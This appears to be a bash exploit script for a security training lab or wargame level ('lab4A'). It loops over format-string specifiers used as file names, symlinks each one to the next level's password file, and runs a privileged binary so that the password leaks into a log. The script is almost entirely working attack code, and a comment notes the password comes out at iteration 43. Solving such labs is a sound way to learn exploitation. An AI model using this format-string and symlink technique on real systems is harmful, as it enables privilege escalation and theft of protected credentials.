#!/bin/bash

cd /tmp 
rm -rf backups/ 
mkdir backups 
chmod 777 backups 
 
# In practice this loop will yield the password at it's 43th iteration.
for ((i=0;i<50;i++))
do 
	echo "Param: $i"
	filename="%$i\$s"
	rm -f $filename
	ln -s /home/lab4end/.pass $filename
	/levels/lab04/lab4A $filename
	cat ./backups/.log 
	truncate -s 0 ./backups/.log
done


